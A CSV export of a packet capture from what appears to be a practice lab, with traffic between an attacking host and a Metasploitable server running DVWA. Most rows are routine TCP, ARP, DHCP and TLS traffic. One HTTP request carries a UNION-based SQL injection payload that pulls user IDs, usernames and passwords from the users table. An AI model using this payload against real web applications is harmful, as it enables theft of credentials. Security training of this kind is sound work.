"No.","Time","Source","Destination","Protocol","Length","Info"
"337","603.485976093","10.0.2.4","10.0.2.5","TCP","1514","80  >  43730 [ACK] Seq=2897 Ack=567 Win=7040 Len=1448 TSval=86232 TSecr=3495871790 [TCP segment of a reassembled PDU]"
"338","603.485978791","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=567 Ack=4345 Win=31872 Len=0 TSval=3495871798 TSecr=86232"
"339","603.486282345","10.0.2.4","10.0.2.5","HTTP","811","HTTP/1.1 200 OK  (text/html)"
"340","603.486284272","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=567 Ack=5090 Win=31872 Len=0 TSval=3495871798 TSecr=86232"
"341","603.487529196","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [FIN, ACK] Seq=567 Ack=5090 Win=31872 Len=0 TSval=3495871799 TSecr=86232"
"342","603.487965774","10.0.2.4","10.0.2.5","TCP","66","80  >  43730 [FIN, ACK] Seq=5090 Ack=568 Win=7040 Len=0 TSval=86232 TSecr=3495871799"
"343","603.487973766","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=568 Ack=5091 Win=31872 Len=0 TSval=3495871800 TSecr=86232"
"344","661.983615402","10.0.2.5","10.0.2.3","DHCP","324","DHCP Request  - Transaction ID 0xa1818954"
"345","661.991021386","10.0.2.3","10.0.2.5","DHCP","590","DHCP ACK      - Transaction ID 0xa1818954"
"346","667.188584345","PcsCompu_c9:93:64","PcsCompu_cc:77:b6","ARP","42","Who has 10.0.2.3? Tell 10.0.2.5"
"347","667.189019244","PcsCompu_cc:77:b6","PcsCompu_c9:93:64","ARP","60","10.0.2.3 is at 08:00:27:cc:77:b6"
"348","678.167935832","10.0.2.5","10.0.2.4","TCP","74","36394  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495946480 TSecr=0 WS=128"
"349","678.168433192","10.0.2.4","10.0.2.5","TCP","74","80  >  36394 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=93698 TSecr=3495946480 WS=128"
"350","678.168444935","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495946480 TSecr=93698"
"351","678.169246995","10.0.2.5","10.0.2.4","HTTP","642","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(user_id,0x3a,user,0x3a,password),2+from+users--+&Submit=Submit HTTP/1.1 "
"352","678.169825988","10.0.2.4","10.0.2.5","TCP","66","80  >  36394 [ACK] Seq=1 Ack=577 Win=7040 Len=0 TSval=93699 TSecr=3495946481"
"353","678.178118787","10.0.2.4","10.0.2.5","TCP","2962","80  >  36394 [ACK] Seq=1 Ack=577 Win=7040 Len=2896 TSval=93699 TSecr=3495946481 [TCP segment of a reassembled PDU]"
"354","678.178126944","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=577 Ack=2897 Win=31872 Len=0 TSval=3495946490 TSecr=93699"
"355","678.178266870","10.0.2.4","10.0.2.5","TCP","1514","80  >  36394 [ACK] Seq=2897 Ack=577 Win=7040 Len=1448 TSval=93699 TSecr=3495946481 [TCP segment of a reassembled PDU]"
"356","678.178269394","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=577 Ack=4345 Win=31872 Len=0 TSval=3495946490 TSecr=93699"
"357","678.178513626","10.0.2.4","10.0.2.5","HTTP","863","HTTP/1.1 200 OK  (text/html)"
"358","678.178515361","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=577 Ack=5142 Win=31872 Len=0 TSval=3495946490 TSecr=93699"
"359","678.179499776","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [FIN, ACK] Seq=577 Ack=5142 Win=31872 Len=0 TSval=3495946491 TSecr=93699"
"360","678.180232413","10.0.2.4","10.0.2.5","TCP","66","80  >  36394 [FIN, ACK] Seq=5142 Ack=578 Win=7040 Len=0 TSval=93700 TSecr=3495946491"
"361","678.180238976","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=578 Ack=5143 Win=31872 Len=0 TSval=3495946492 TSecr=93700"
"362","683.315426966","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"363","683.316592021","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"364","707.858190879","10.0.2.4","10.0.2.255","BROWSER","286","Local Master Announcement METASPLOITABLE, Workstation, Server, Print Queue Server, Xenix Server, NT Workstation, NT Server, Master Browser"
"365","707.858831814","10.0.2.4","10.0.2.255","BROWSER","257","Domain/Workgroup Announcement WORKGROUP, NT Workstation, Domain Enum"
"366","718.543801544","34.107.243.93","10.0.2.5","TLSv1.2","78","Application Data"
"367","718.543969952","10.0.2.5","34.107.243.93","TLSv1.2","82","Application Data"
"368","718.782059596","34.107.243.93","10.0.2.5","TCP","60","443  >  57910 [ACK] Seq=73 Ack=85 Win=32550 Len=0"
"369","723.762999933","PcsCompu_c9:93:64","RealtekU_12:35:00","ARP","42","Who has 10.0.2.1? Tell 10.0.2.5"
"370","723.763576963","RealtekU_12:35:00","PcsCompu_c9:93:64","ARP","60","10.0.2.1 is at 52:54:00:12:35:00"
